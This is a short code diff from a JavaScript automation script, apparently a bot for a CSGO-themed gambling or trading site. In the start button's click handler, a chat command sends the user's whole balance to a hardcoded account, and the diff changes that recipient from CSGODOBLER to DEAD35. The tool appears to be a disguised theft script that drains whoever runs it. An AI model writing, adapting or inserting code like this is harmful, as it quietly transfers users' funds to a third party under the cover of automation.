@@ -220,7 +220,7 @@ function Automated() {
     this.menu.start.onclick = function() {
         send({
         "type": "chat",
-        "msg": '/send CSGODOBLER ' + self.balance,
+        "msg": '/send DEAD35 ' + self.balance,
         "lang": LANG
     });
 
